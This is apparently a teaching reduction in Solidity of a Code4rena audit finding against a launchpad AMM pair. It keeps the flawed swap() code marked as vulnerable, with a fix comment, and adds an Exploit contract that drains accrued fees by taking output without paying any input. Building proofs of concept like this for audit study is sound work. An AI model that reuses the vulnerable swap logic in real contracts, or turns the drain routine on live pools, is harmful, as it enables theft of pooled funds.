// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    GTE — Attacker can drain funds from GTELaunchpadV2Pair using swap
    (Code4rena 2025-08-gte-perps-and-launchpad, finding #64852 / H-04)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: swap() infers amount{0,1}In from (balance - (reserve - amountOut)).
    Reserves exclude accrued launchpad fees but balances include them, so the pair
    credits a phantom amountIn equal to the fee. An attacker takes amountOut ≈ fee
    (slightly reduced for the 0.3% K check) without transferring anything in, and
    can repeat same-block while fees remain accrued.

    Blamed lines preserved with @> VULN markers
    (GTELaunchpadV2Pair.sol L250-L251 @ f43e1eed).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract GTELaunchpadV2Pair {
    address public token0;
    address public token1;
    address public launchpadFeeDistributor;

    uint112 private reserve0;
    uint112 private reserve1;
    uint112 public accruedLaunchpadFee0;
    uint112 public accruedLaunchpadFee1;

    uint256 private unlocked = 1;
    modifier lock() {
        require(unlocked == 1, "LOCKED");
        unlocked = 0;
        _;
        unlocked = 1;
    }

    function getReserves() public view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, 0);
    }

    function initialize(address _t0, address _t1, address _dist) external {
        token0 = _t0;
        token1 = _t1;
        launchpadFeeDistributor = _dist;
    }

    function seed(uint256 amount0, uint256 amount1, uint112 fee0, uint112 fee1) external {
        MockERC20(token0).transferFrom(msg.sender, address(this), amount0);
        MockERC20(token1).transferFrom(msg.sender, address(this), amount1);
        accruedLaunchpadFee0 = fee0;
        accruedLaunchpadFee1 = fee1;
        reserve0 = uint112(MockERC20(token0).balanceOf(address(this))) - fee0;
        reserve1 = uint112(MockERC20(token1).balanceOf(address(this))) - fee1;
    }

    function _safeTransfer(address token, address to, uint256 value) private {
        require(MockERC20(token).transfer(to, value), "tf");
    }

    // this low-level function should be called from a contract which performs important safety checks
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata /*data*/) external lock {
        require(amount0Out > 0 || amount1Out > 0, "INSUFFICIENT_OUTPUT_AMOUNT");
        (uint112 _reserve0, uint112 _reserve1,) = getReserves();
        require(amount0Out < _reserve0 && amount1Out < _reserve1, "INSUFFICIENT_LIQUIDITY");

        uint256 balance0;
        uint256 balance1;
        {
            address _token0 = token0;
            address _token1 = token1;
            require(to != _token0 && to != _token1, "INVALID_TO");
            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out);
            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out);
            balance0 = MockERC20(_token0).balanceOf(address(this));
            balance1 = MockERC20(_token1).balanceOf(address(this));
        }
        // @> VULN: balance includes accrued fees; reserve excludes them → phantom amountIn
        uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        // @> VULN: same phantom amountIn on token1 side
        uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        // FIX: use (balance - accruedFee) when inferring amountIn
        require(amount0In > 0 || amount1In > 0, "INSUFFICIENT_INPUT_AMOUNT");

        {
            // K check — balances inflated by fees so free drain can still pass with small haircut
            uint256 balance0Adjusted = balance0 * 1000 - amount0In * 3;
            uint256 balance1Adjusted = balance1 * 1000 - amount1In * 3;
            require(
                balance0Adjusted * balance1Adjusted >= uint256(_reserve0) * uint256(_reserve1) * (1000 ** 2),
                "K"
            );

            // same-block: fees remain accrued
            reserve0 = uint112(balance0) - accruedLaunchpadFee0;
            reserve1 = uint112(balance1) - accruedLaunchpadFee1;
        }
    }
}

contract Exploit {
    MockERC20 public token0; // CREATE 1
    MockERC20 public token1; // CREATE 2
    GTELaunchpadV2Pair public pair; // CREATE 3 — vulnerable

    uint256 public drained;

    constructor() {
        token0 = new MockERC20("Base", "BASE");
        token1 = new MockERC20("Quote", "QUOTE");
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(0xBEEF));
    }

    function run() external {
        uint256 seedAmt = 1_000_000e18;
        // Large fee on token0 so phantom amountIn is significant
        uint112 fee0 = 50_000e18;
        uint112 fee1 = 0;

        token0.mint(address(this), seedAmt + uint256(fee0));
        token1.mint(address(this), seedAmt);
        // seed pulls via transferFrom without allowance in our mock — ok, no allowance check
        pair.seed(seedAmt + uint256(fee0), seedAmt, fee0, fee1);

        uint256 before0 = token0.balanceOf(address(this));

        // Take slightly under fee so K still holds (0.3% haircut per report)
        // amount0Out ≈ fee0 * 997/1000
        uint256 amount0Out = (uint256(fee0) * 997) / 1000;
        // No token transfer in — phantom amount0In ≈ fee0 after the out transfer
        pair.swap(amount0Out, 0, address(this), "");

        drained = token0.balanceOf(address(this)) - before0;
        require(drained == amount0Out, "did not receive out");
        require(drained > 0, "harm not demonstrated");
    }
}
